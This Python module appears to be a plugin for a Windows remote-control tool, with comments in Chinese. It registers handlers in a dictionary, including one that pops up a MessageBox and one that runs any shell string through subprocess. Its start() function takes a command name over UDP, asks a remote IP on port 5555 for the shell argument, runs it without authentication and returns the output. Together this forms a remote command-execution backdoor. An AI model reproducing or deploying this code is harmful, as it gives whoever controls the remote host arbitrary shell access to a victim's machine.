# -*- coding:UTF-8 -*-
#插件功能列表
#首先是接受要执行的行数 其次执行
import win32api,win32con
import os,subprocess
FUNC_PULG=dict()
def func(function):#做一个装饰器让字典自动生成  让定义的名字与函数名对应
	def set_func(func):
		FUNC_PULG[function]=func
	return set_func

@func("MessageBox")
def Message_Box(shell):
	win32api.MessageBox(0,shell,shell,win32con.MB_OK)
	return
@func("system")
def system_os(shell):
	retcode,output = subprocess.getstatusoutput(shell)
	# print(output)
	return output

def start(cmd,server,ip):
	if cmd.decode() in FUNC_PULG:
		#cmd是接受到执行函数
		server.sendto("输入要执行的shell或者对于的参数:".encode("utf-8"), (ip, 5555))
		#上面server.sendto 执行后 shell等待接收到执行参数
		shell=server.recvfrom(4096)[0]
		# print(str(FUNC_PULG[cmd.decode()]))
		print(cmd.decode())
		print(shell.decode())
		info=str(FUNC_PULG[cmd.decode()](shell.decode()))
		return info#返回处理结果 做一个判断防止报错导致程序关闭
	else:
		return "没有此功能"
